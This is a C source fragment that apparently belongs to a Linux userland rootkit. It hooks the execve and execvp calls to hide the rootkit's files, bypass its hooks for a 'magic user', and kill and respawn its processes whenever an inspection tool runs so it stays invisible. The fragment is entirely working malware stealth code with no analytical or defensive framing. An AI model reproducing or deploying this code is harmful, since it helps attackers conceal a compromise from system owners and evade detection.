int execve(const char *filename, char *const argv[], char *const envp[]){
    hook(o_execve, "execve");
    if(magic_user())
        goto end_execve;

    if(hxstat(filename)){
        errno = ENOENT;
        return -1;
    }

    pid_t child;
    /* if someone is running a process that could lead to us being visible,
     * kill all rootkit processes. */
    if(is_bad_proc(filename)){
        /* they need root privs to be able to kill rk procs. */
        if(getuid() != 0 && geteuid() != 0){
            errno = EPERM;
            return -1;
        }

        kill_rk_procs();

        child = fork();
        if(child < 0) return -1;
        else if(child == 0) return o_execve(filename, argv, envp);
        wait(NULL);

        execl(default_fork[0], default_fork[1], default_fork[2], NULL);
        exit(0);
    }

    for(int i = 0 ; hprocs[i] != NULL; i++){
        char fnm_proc[64];
        snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", hprocs[i]);

        if(strstr(cprocname(), hprocs[i]) || strstr(filename, hprocs[i]) || !fnmatch(fnm_proc, filename, FNM_PATHNAME) || getenv(hprocs[i])){
            if(getuid() != 0 && geteuid() != 0){
                errno = EPERM;
                return -1;
            }

            return remove_self(filename, argv, envp);
        }
    }
end_execve:
    return o_execve(filename,argv,envp);
}

int execvp(const char *filename, char *const argv[]){
    hook(o_execvp, "execvp");
    if(magic_user())
        goto end_execvp;

    pid_t child;
    /* if someone is running a process that could lead to us being visible,
     * kill all rootkit processes. */
    if(is_bad_proc(filename)){
        /* they need root privs to be able to kill rk procs. */
        if(getuid() != 0 && geteuid() != 0){
            errno = EPERM;
            return -1;
        }

        kill_rk_procs();

        child = fork();
        if(child < 0) return -1;
        else if(child == 0) return o_execvp(filename, argv);
        wait(NULL);

        execl(default_fork[0], default_fork[1], default_fork[2], NULL);
        exit(0);
    }

    for(int i = 0 ; hprocs[i] != NULL; i++){
        char fnm_proc[64];
        snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", hprocs[i]);

        if(strstr(cprocname(), hprocs[i]) || strstr(filename, hprocs[i]) || !fnmatch(fnm_proc, filename, FNM_PATHNAME) || getenv(hprocs[i])){
            if(getuid() != 0 && geteuid() != 0){
                errno = EPERM;
                return -1;
            }

            return remove_self(filename, argv, NULL);
        }
    }

end_execvp:
    return o_execvp(filename, argv);
}